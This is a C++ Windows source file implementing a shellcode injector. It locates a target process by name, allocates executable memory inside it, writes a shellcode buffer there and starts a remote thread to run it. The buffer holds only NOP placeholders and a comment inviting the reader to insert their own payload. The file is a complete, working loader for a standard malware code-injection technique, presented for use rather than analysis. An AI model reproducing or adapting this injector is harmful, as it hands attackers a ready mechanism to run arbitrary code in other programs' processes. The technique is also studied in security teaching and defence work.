#include <windows.h>
#include <iostream>
#include <vector>
#include <TlHelp32.h>

class Injector {
private:
    DWORD processId;
    HANDLE processHandle;
    
    // Shellcode example (you can modify this)
    unsigned char shellcode[32] = {
        0x90, 0x90, 0x90, 0x90  // NOPs for example
        // Add your shellcode here
    };

public:
    // Find process by name
    DWORD GetProcessIdByName(const wchar_t* processName) {
        DWORD procId = 0;
        HANDLE snapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
        
        if (snapshot != INVALID_HANDLE_VALUE) {
            PROCESSENTRY32W processEntry;
            processEntry.dwSize = sizeof(processEntry);
            
            if (Process32FirstW(snapshot, &processEntry)) {
                do {
                    if (_wcsicmp(processEntry.szExeFile, processName) == 0) {
                        procId = processEntry.th32ProcessID;
                        break;
                    }
                } while (Process32NextW(snapshot, &processEntry));
            }
            CloseHandle(snapshot);
        }
        return procId;
    }

    // Inject shellcode
    bool InjectShellcode(const wchar_t* targetProcess) {
        // Get process ID
        processId = GetProcessIdByName(targetProcess);
        if (!processId) {
            std::cout << "Process not found!" << std::endl;
            return false;
        }

        // Open process
        processHandle = OpenProcess(
            PROCESS_ALL_ACCESS,
            FALSE,
            processId
        );

        if (!processHandle) {
            std::cout << "Failed to open process!" << std::endl;
            return false;
        }

        // Allocate memory in target process
        LPVOID remoteBuffer = VirtualAllocEx(
            processHandle,
            NULL,
            sizeof(shellcode),
            MEM_COMMIT | MEM_RESERVE,
            PAGE_EXECUTE_READWRITE
        );

        if (!remoteBuffer) {
            std::cout << "Failed to allocate memory!" << std::endl;
            CloseHandle(processHandle);
            return false;
        }

        // Write shellcode to allocated memory
        if (!WriteProcessMemory(
            processHandle,
            remoteBuffer,
            shellcode,
            sizeof(shellcode),
            nullptr
        )) {
            std::cout << "Failed to write memory!" << std::endl;
            VirtualFreeEx(processHandle, remoteBuffer, 0, MEM_RELEASE);
            CloseHandle(processHandle);
            return false;
        }

        // Create remote thread to execute shellcode
        HANDLE remoteThread = CreateRemoteThread(
            processHandle,
            nullptr,
            0,
            (LPTHREAD_START_ROUTINE)remoteBuffer,
            nullptr,
            0,
            nullptr
        );

        if (!remoteThread) {
            std::cout << "Failed to create remote thread!" << std::endl;
            VirtualFreeEx(processHandle, remoteBuffer, 0, MEM_RELEASE);
            CloseHandle(processHandle);
            return false;
        }

        // Cleanup
        CloseHandle(remoteThread);
        CloseHandle(processHandle);
        
        std::cout << "Injection successful!" << std::endl;
        return true;
    }
};

int main() {
    Injector injector;
    injector.InjectShellcode(L"notepad.exe");  // Example target
    return 0;
}
